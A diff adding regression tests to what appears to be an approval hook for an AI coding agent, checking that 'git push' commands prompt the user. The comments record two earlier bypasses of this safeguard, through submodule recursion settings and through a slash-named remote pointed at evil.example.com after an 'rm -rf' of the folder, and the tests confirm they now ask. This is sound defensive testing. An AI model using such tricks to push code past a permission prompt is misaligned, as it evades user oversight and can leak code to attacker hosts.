@@ -202,6 +202,56 @@ try {
     for (const c of ["git push", "cd nested && git push", "git -C nested push"]) assert.equal((await asked(c, undefined, undefined)).modals, 1, `no shell folder, nested repository: ${c} asks`);
     assert.equal((await asked(`cd ${nested} && git push`, undefined, undefined)).modals, 0, "no shell folder: an absolute cd still places the push");
     ok("unresolvable pushes (cd \"$X\", cd;, subshell, cd after another command, branch switch, run-time git dir) ask every time");
+
+    // Verify r2 (head a7e6c21e5), each ran silently there:
+    // F5 — a silent `git config submodule.recurse true` (or push.recurseSubmodules on-demand) made a remembered
+    // `git push origin` also push a submodule's commits to the submodule's own remote. Any scope git reads counts.
+    assert.equal((await asked("git push origin", work, undefined)).modals, 0, "control: the outer repository's origin is remembered");
+    const incl = path.join(tmp, "recurse.inc");
+    fs.writeFileSync(incl, "[submodule]\n\trecurse\n");
+    const globalCfg = path.join(tmp, "global.gitconfig");
+    for (const [label, on, off] of [
+      ["submodule.recurse true", () => git(work, "config", "submodule.recurse", "true"), () => git(work, "config", "--unset", "submodule.recurse")],
+      ["push.recurseSubmodules on-demand", () => git(work, "config", "push.recurseSubmodules", "on-demand"), () => git(work, "config", "--unset", "push.recurseSubmodules")],
+      ["push.recurseSubmodules only", () => git(work, "config", "push.recurseSubmodules", "only"), () => git(work, "config", "--unset", "push.recurseSubmodules")],
+      ["includeIf adds a valueless submodule.recurse", () => git(work, "config", `includeIf.gitdir:${work}/.git.path`, incl), () => git(work, "config", "--unset", `includeIf.gitdir:${work}/.git.path`)],
+      ["global config submodule.recurse true", () => { fs.writeFileSync(globalCfg, "[submodule]\n\trecurse = true\n"); env.GIT_CONFIG_GLOBAL = globalCfg; }, () => { env.GIT_CONFIG_GLOBAL = "/dev/null"; }],
+    ]) {
+      on();
+      r = await asked("git push origin", work, "허락");
+      assert.equal(r.modals, 1, `F5: ${label}: a remembered push asks`);
+      assert.deepEqual(r.prompt.outward, { destinations: [], remembers: false }, `F5: ${label}: and says it will ask again`);
+      assert.equal((await asked("git push origin", work, undefined)).modals, 1, `F5: ${label}: never remembered`);
+      off();
+      assert.equal((await asked("git push origin", work, undefined)).modals, 0, `F5 control: ${label} removed, silent again`);
+    }
+    for (const [k, v] of [["submodule.recurse", "false"], ["push.recurseSubmodules", "check"], ["push.recurseSubmodules", "no"]]) {
+      git(work, "config", k, v);
+      assert.equal((await asked("git push origin", work, undefined)).modals, 0, `F5 control: ${k}=${v} pushes no submodule, stays silent`);
+      git(work, "config", "--unset", k);
+    }
+    ok("verify r2 F5: submodule recursion from local, include or global config makes a remembered push ask every time");
+
+    // F6 — a remote name with `/` was read as a folder: `foo/bar` allowed as a local folder, then
+    // `rm -rf foo && git remote add foo/bar https://evil…` and `git push foo/bar` ran silently to evil.
+    fs.mkdirSync(path.join(work, "foo"));
+    git(work, "init", "-q", "--bare", "foo/bar");
+    r = await asked("git push foo/bar HEAD:refs/heads/x", work, "허락");
+    assert.deepEqual([r.modals, r.prompt?.outward?.destinations], [1, [`file://${work}/foo/bar`]], "F6: a local folder push asks once for the folder");
+    assert.equal((await asked("git push foo/bar HEAD:refs/heads/x", work, undefined)).modals, 0, "control: the same folder is remembered");
+    fs.rmSync(path.join(work, "foo"), { recursive: true, force: true });
+    git(work, "remote", "add", "foo/bar", "https://evil.example.com/x.git");
+    r = await asked("git push foo/bar HEAD:refs/heads/x", work, undefined);
+    assert.deepEqual([r.modals, r.prompt?.outward?.destinations], [1, ["https://evil.example.com/x"]], "F6: the name is now a remote: asks for the remote's address");
+    for (const [name, url] of [["Up.Per.Case", "https://evil.example.com/u.git"], ["a.b", "https://evil.example.com/d.git"], ["team/a.b", "https://evil.example.com/s.git"]]) {
+      git(work, "remote", "add", name, url);
+      r = await asked(`git push ${name}`, work, undefined);
+      assert.deepEqual([r.modals, r.prompt?.outward?.destinations], [1, [url.replace(/\.git$/, "")]], `F6: remote ${name} resolves to its address`);
+    }
+    r = await asked("git push nosuch/x", work, "허락");
+    assert.deepEqual([r.modals, r.prompt?.outward], [1, { destinations: [], remembers: false }], "F6: neither a remote nor an existing folder: asks and says it will ask again");
+    assert.equal((await asked("git push nosuch/x", work, undefined)).modals, 1, "F6: never remembered");
+    ok("verify r2 F6: a push word is looked up as a remote first (slashes, dots, case); otherwise only an anchored or existing folder");
   }
 
   // ── 2. runSdkCoach: the PreToolUse hook's cwd reaches the approval as shellCwd ──
